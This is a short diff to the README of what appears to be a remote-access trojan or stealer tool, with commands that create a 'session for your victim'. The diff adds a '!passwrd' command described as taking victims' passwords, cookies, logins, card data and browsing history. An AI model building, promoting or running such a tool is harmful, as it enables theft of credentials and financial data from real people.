@@ -58,6 +58,7 @@ pyinstaller filename --one-file --window
 !website (website url): Goes to the website.
 !cmd: Displays the best CMD commands (also available on the internet).
 !session : Create a session for your victim. (Needs a restart to use.)
+!passwrd : Get Passwords & Accounts Cookies & Logins & Cards & Web History & Downloads & Info.
 ```
 
 ## **Contact**
